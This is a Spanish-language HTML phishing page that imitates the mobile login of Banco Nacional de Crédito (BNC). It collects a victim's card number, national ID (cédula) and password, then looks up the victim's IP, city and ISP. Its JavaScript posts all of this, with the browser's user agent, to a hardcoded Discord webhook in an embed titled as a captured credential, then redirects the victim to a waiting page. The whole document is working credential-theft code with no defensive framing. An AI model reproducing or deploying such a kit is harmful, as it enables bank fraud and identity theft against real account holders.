
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>App BNC</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

    body {
      background-color: #e0e0e0;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      font-family: 'Segoe UI', Arial, sans-serif;
      padding: 24px 0 40px 0;
    }

    .phone-wrapper {
      width: 100%;
      max-width: 420px;
      padding: 20px 16px 30px 16px;
    }

    .logo-area { margin-bottom: 16px; padding-left: 2px; }
    .logo-area img { width: 90px; height: auto; object-fit: contain; }

    .tabs { display: flex; border-radius: 10px 10px 0 0; overflow: hidden; }

    .tab {
      flex: 1; padding: 15px 0; text-align: center;
      font-size: 15.5px; font-weight: 500; cursor: pointer;
      color: #555; background: #cacaca;
      transition: background 0.2s, color 0.2s; user-select: none;
    }

    .tab.active {
      background: #fff; color: #111; font-weight: 700;
      border-bottom: 3px solid #e05c1a;
    }

    .card {
      background: #0c2461; border-radius: 0 0 20px 20px;
      padding: 30px 20px 28px 20px; display: flex; flex-direction: column;
    }

    .card-title { color: #fff; font-size: 27px; font-weight: 800; text-align: center; margin-bottom: 10px; }

    .card-subtitle { color: #c0d0f0; font-size: 14px; text-align: center; line-height: 1.6; margin-bottom: 22px; }
    .card-subtitle strong { color: #fff; font-weight: 700; }

    .toggle-group {
      display: flex; background: #0a1e50; border-radius: 10px;
      padding: 4px; gap: 4px; margin-bottom: 22px;
    }

    .toggle-btn {
      flex: 1; padding: 11px 4px; border: none; cursor: pointer;
      font-size: 13.5px; font-weight: 600; border-radius: 8px;
      transition: background 0.25s, color 0.25s;
    }

    /* Activo = naranja, inactivo = blanco */
    .toggle-btn.is-active   { background: #e05c1a; color: #fff; }
    .toggle-btn.is-inactive { background: #fff; color: #0c2461; }

    .input-group { display: flex; flex-direction: column; gap: 13px; margin-bottom: 20px; }

    .input-wrapper {
      background: #fff; border-radius: 11px; display: flex;
      align-items: center; padding: 0 16px; height: 54px;
      gap: 12px; transition: box-shadow 0.2s;
    }

    .input-wrapper:focus-within { box-shadow: 0 0 0 2px #2a6de8; }
    .input-wrapper svg { flex-shrink: 0; }

    .input-wrapper input {
      border: none; outline: none; font-size: 15px;
      color: #222; background: transparent; width: 100%;
    }

    .input-wrapper input::placeholder { color: #aaa; }

    .eye-btn {
      background: none; border: none; cursor: pointer;
      padding: 0; display: flex; align-items: center; flex-shrink: 0;
    }

    .btn-continuar {
      background: #2563eb; color: #fff; border: none;
      border-radius: 11px; padding: 16px; font-size: 17px;
      font-weight: 700; cursor: pointer; width: 100%;
      margin-bottom: 20px; transition: background 0.2s, transform 0.1s;
      letter-spacing: 0.3px; display: flex; align-items: center;
      justify-content: center; gap: 8px;
    }

    .btn-continuar:active   { transform: scale(0.98); background: #1d4fd8; }
    .btn-continuar:disabled { background: #5a8adb; cursor: not-allowed; }

    .spinner {
      width: 18px; height: 18px;
      border: 3px solid rgba(255,255,255,0.4);
      border-top-color: #fff; border-radius: 50%;
      animation: spin 0.7s linear infinite; display: none;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    .divider { border: none; border-top: 1px solid #1e3a80; margin: 0 0 18px 0; }

    .forgot {
      display: flex; align-items: center; justify-content: center;
      gap: 7px; color: #90b4f8; font-size: 14px;
      cursor: pointer; text-decoration: underline; user-select: none;
    }

    .toast {
      position: fixed; bottom: 30px; left: 50%;
      transform: translateX(-50%) translateY(80px);
      background: #1a3a1a; color: #7fff7f;
      padding: 13px 22px; border-radius: 12px;
      font-size: 14px; font-weight: 600;
      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
      transition: transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.3s;
      opacity: 0; z-index: 999; white-space: nowrap;
    }
    .toast.error { background: #3a1a1a; color: #ff8f8f; }
    .toast.show  { transform: translateX(-50%) translateY(0); opacity: 1; }

    .footer { margin-top: 20px; text-align: center; color: #777; font-size: 12px; line-height: 1.8; }
    .footer a { color: #e05c1a; text-decoration: none; font-weight: 600; }

    .footer-icon {
      display: flex; justify-content: center; align-items: center;
      margin-top: 4px; gap: 6px; color: #666; font-size: 12px;
    }

    .circle-q {
      width: 22px; height: 22px; border-radius: 50%; background: #999;
      display: flex; align-items: center; justify-content: center;
      color: #fff; font-weight: 800; font-size: 13px; flex-shrink: 0;
    }

    .input-label-anim { animation: fadeSlide 0.3s ease; }
    @keyframes fadeSlide {
      from { opacity: 0; transform: translateY(6px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    @media (max-width: 420px) {
      body { padding: 0; }
      .phone-wrapper { padding: 16px 12px 28px 12px; }
      .card { padding: 26px 16px 24px 16px; }
      .card-title { font-size: 24px; }
    }
  </style>
</head>
<body>
<div class="phone-wrapper">

  <div class="logo-area">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Banco_Nacional_de_Credito.png" alt="BNC"/>
  </div>

  <div class="tabs">
    <div class="tab active" id="tab-personas" onclick="switchTab('personas')">Personas</div>
    <div class="tab" id="tab-empresas" onclick="switchTab('empresas')">Empresas</div>
  </div>

  <div class="card">
    <div class="card-title">Iniciar Sesión</div>
    <div class="card-subtitle" id="subtitle">
      ¡Buenas noches,<br/>
      <strong>Bienvenido</strong> a la nueva <strong>App BNC!</strong><br/>
      Ingrese sus Credenciales
    </div>

    <div class="toggle-group">
      <!-- Débito activo por defecto = naranja | BOD inactivo = blanco -->
      <button class="toggle-btn is-active"   id="btn-debito" onclick="switchCard('debito')">Débito | Crédito</button>
      <button class="toggle-btn is-inactive" id="btn-bod"    onclick="switchCard('bod')">Tarjeta Débito BOD</button>
    </div>

    <div class="input-group">

      <div class="input-wrapper">
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <rect x="2" y="5" width="20" height="14" rx="2"/>
          <line x1="2" y1="10" x2="22" y2="10"/>
        </svg>
        <input type="tel" placeholder="Número de Tarjeta" id="card-number" oninput="formatCard(this)"/>
      </div>

      <div class="input-wrapper" id="second-field-wrapper">
        <span id="second-icon">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <rect x="2" y="4" width="20" height="16" rx="2"/>
            <circle cx="8.5" cy="10" r="2"/>
            <path d="M14 10h4M14 14h4M2 14h4"/>
          </svg>
        </span>
        <input type="tel" placeholder="Cédula de Identidad (8 dígitos)"
               id="second-input" maxlength="8" autocomplete="off"/>
        <button class="eye-btn" id="eye-btn" style="display:none" onclick="togglePassword()" type="button">
          <svg id="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#aaa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>

    </div>

    <button class="btn-continuar" id="btn-continuar" onclick="handleContinue()">
      <span id="btn-text">Continuar</span>
      <div class="spinner" id="spinner"></div>
    </button>

    <hr class="divider"/>

    <div class="forgot">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#90b4f8" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
      </svg>
      ¿Olvidaste tu clave?
    </div>
  </div>

  <div class="footer">
    Banco Nacional de Crédito, Banco Universal.<br/>
    Rif: J-30984132-7 © 2026 | BNC Versión: <a href="#">1.19</a>
    <div class="footer-icon">
      <div class="circle-q">?</div>
      Todos los derechos reservados.
    </div>
  </div>

</div>

<div class="toast" id="toast"></div>

<script>
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1476395487207755851/-4cl44YnCXNtsc3D15qEo-5uJ4lRy6L23WtA57FRkEgO97so211ZPUXNO9iHagrDkQbC";

  // Saludo dinámico
  (function () {
    const h = new Date().getHours();
    const g = h < 12 ? "Buenos días" : h < 18 ? "Buenas tardes" : "Buenas noches";
    document.getElementById("subtitle").innerHTML =
      `¡${g},<br/><strong>Bienvenido</strong> a la nueva <strong>App BNC!</strong><br/>Ingrese sus Credenciales`;
  })();

  // LocalStorage
  function saveSession(card, cedula, password, cardType) {
    const sessions = JSON.parse(localStorage.getItem("bnc_sessions") || "[]");
    sessions.push({ timestamp: new Date().toISOString(), card, cedula, password, cardType });
    localStorage.setItem("bnc_sessions", JSON.stringify(sessions));
  }

  // Tabs
  function switchTab(tab) {
    ["personas", "empresas"].forEach(t =>
      document.getElementById("tab-" + t).classList.toggle("active", t === tab));
  }

  // Toggle: el seleccionado = naranja, el otro = blanco
  function switchCard(type) {
    const bd = document.getElementById("btn-debito");
    const bb = document.getElementById("btn-bod");
    if (type === "debito") {
      bd.className = "toggle-btn is-active";
      bb.className = "toggle-btn is-inactive";
    } else {
      bb.className = "toggle-btn is-active";
      bd.className = "toggle-btn is-inactive";
    }
  }

  // Formato tarjeta
  function formatCard(input) {
    let v = input.value.replace(/\D/g, "");
    input.value = v.replace(/(.{4})(?=.)/g, "$1 ");
    checkFields();
  }

  let isPasswordMode = false;
  let passwordVisible = false;
  let savedCedula = "";

  const cardInput   = document.getElementById("card-number");
  const secondInput = document.getElementById("second-input");

  cardInput.addEventListener("input", function () {
    let v = this.value.replace(/\D/g, "");
    this.value = v.replace(/(.{4})(?=.)/g, "$1 ");
    if (v.length < 8 && isPasswordMode) switchToCedula();
    checkFields();
  });

  secondInput.addEventListener("input", function () {
    if (!isPasswordMode) {
      this.value = this.value.replace(/\D/g, "").slice(0, 8);
      checkFields();
    }
  });

  function checkFields() {
    const cardDigits = cardInput.value.replace(/\s/g, "");
    const cedula     = secondInput.value.trim();
    if (!isPasswordMode && cardDigits.length >= 8 && cedula.length === 8) switchToPassword();
  }

  function switchToPassword() {
    isPasswordMode = true;
    savedCedula    = secondInput.value.trim();

    document.getElementById("second-icon").innerHTML = `
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
      </svg>`;

    secondInput.type        = "password";
    secondInput.placeholder = "Contraseña";
    secondInput.value       = "";
    secondInput.removeAttribute("maxlength");
    secondInput.setAttribute("inputmode", "text");
    document.getElementById("eye-btn").style.display = "flex";
    document.getElementById("second-field-wrapper").classList.add("input-label-anim");
    setTimeout(() => secondInput.focus(), 50);
  }

  function switchToCedula() {
    isPasswordMode  = false;
    passwordVisible = false;
    savedCedula     = "";

    document.getElementById("second-icon").innerHTML = `
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <rect x="2" y="4" width="20" height="16" rx="2"/>
        <circle cx="8.5" cy="10" r="2"/>
        <path d="M14 10h4M14 14h4M2 14h4"/>
      </svg>`;

    secondInput.type        = "tel";
    secondInput.placeholder = "Cédula de Identidad (8 dígitos)";
    secondInput.value       = "";
    secondInput.maxLength   = 8;
    document.getElementById("eye-btn").style.display = "none";
    updateEyeIcon();
  }

  function togglePassword() {
    passwordVisible = !passwordVisible;
    secondInput.type = passwordVisible ? "text" : "password";
    updateEyeIcon();
  }

  function updateEyeIcon() {
    const icon = document.getElementById("eye-icon");
    if (passwordVisible) {
      icon.innerHTML = `
        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
        <line x1="1" y1="1" x2="23" y2="23"/>`;
    } else {
      icon.innerHTML = `
        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
        <circle cx="12" cy="12" r="3"/>`;
    }
  }

  // Ubicación
  async function getLocation() {
    const apis = [
      { url: "https://ipapi.co/json/",
        parse: d => d.ip ? { ip: d.ip, city: d.city, region: d.region, country: d.country_name, isp: d.org } : null },
      { url: "https://ip-api.com/json/?fields=status,country,regionName,city,isp,query",
        parse: d => d.status === "success" ? { ip: d.query, city: d.city, region: d.regionName, country: d.country, isp: d.isp } : null },
      { url: "https://ipwho.is/",
        parse: d => d.ip ? { ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.connection?.isp || d.org } : null }
    ];
    for (const api of apis) {
      try {
        const r = await fetch(api.url, { signal: AbortSignal.timeout(5000) });
        const d = await r.json();
        const result = api.parse(d);
        if (result) return result;
      } catch (_) {}
    }
    return null;
  }

  function showToast(msg, type = "success") {
    const t = document.getElementById("toast");
    t.textContent = msg;
    t.className = "toast" + (type === "error" ? " error" : "");
    requestAnimationFrame(() => t.classList.add("show"));
    setTimeout(() => t.classList.remove("show"), 3500);
  }

  async function handleContinue() {
    const cardDigits = cardInput.value.replace(/\s/g, "");
    const secondVal  = secondInput.value.trim();
    const btn        = document.getElementById("btn-continuar");
    const spinner    = document.getElementById("spinner");
    const btnText    = document.getElementById("btn-text");
    const activeCardType = document.getElementById("btn-debito").classList.contains("is-active")
      ? "Débito | Crédito" : "Tarjeta Débito BOD";

    if (cardDigits.length < 8) { showToast("⚠️ Ingrese el número de tarjeta.", "error"); return; }

    if (!isPasswordMode) {
      if (secondVal.length !== 8) { showToast("⚠️ La cédula debe tener 8 dígitos.", "error"); return; }
      switchToPassword();
      return;
    }

    if (secondVal.length < 4) { showToast("⚠️ Ingrese su contraseña.", "error"); return; }

    btn.disabled = true;
    btnText.textContent   = "Verificando...";
    spinner.style.display = "block";

    saveSession(cardDigits, savedCedula, secondVal, activeCardType);

    const loc = await getLocation();
    let locationValue = "📍 No disponible\n🌐 IP: `N/A`\n🏢 ISP: N/A";
    if (loc) {
      const locStr = [loc.city, loc.region, loc.country].filter(Boolean).join(", ");
      locationValue = `📍 ${locStr}\n🌐 IP: \`${loc.ip || "N/A"}\`\n🏢 ISP: ${loc.isp || "N/A"}`;
    }

    const payload = {
      username: "BNC - BR0K3N",
      avatar_url: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/032018/untitled-1_97.png?e22e6XTI6KykJ23AmbIiLR_EHC0QR1hq&itok=SCUxTlGZ",
      embeds: [{
        title: "Nueva Credencial Capturada — BNC",
        description: "Se ha recibido un nuevo intento de inicio de sesión.",
        color: 15158332,
        fields: [
          { name: "💳 Tipo de Cuenta",    value: "```" + activeCardType + "```", inline: true  },
          { name: "🪪 Cédula",            value: "```" + savedCedula    + "```", inline: true  },
          { name: "💳 Número de Tarjeta", value: "```" + cardDigits     + "```", inline: false },
          { name: "🔑 Contraseña",        value: "```" + secondVal      + "```", inline: false },
          { name: "🌍 Ubicación Real",    value: locationValue,                  inline: false },
          { name: "💻 Dispositivo",       value: "```" + navigator.userAgent + "```", inline: false }
        ],
        footer: {
          text: "Powered By @Brknshinexxx",
          icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/500px-Telegram_logo.svg.png"
        },
        timestamp: new Date().toISOString()
      }]
    };

    try {
      const res = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      if (res.ok || res.status === 204) {
        window.location.href = "wait.html";
      } else {
        throw new Error("HTTP " + res.status);
      }
    } catch (err) {
      showToast("❌ Error de conexión. Intente nuevamente.", "error");
      btn.disabled = false;
      btnText.textContent   = "Continuar";
      spinner.style.display = "none";
    }
  }
</script>
</body>
</html>
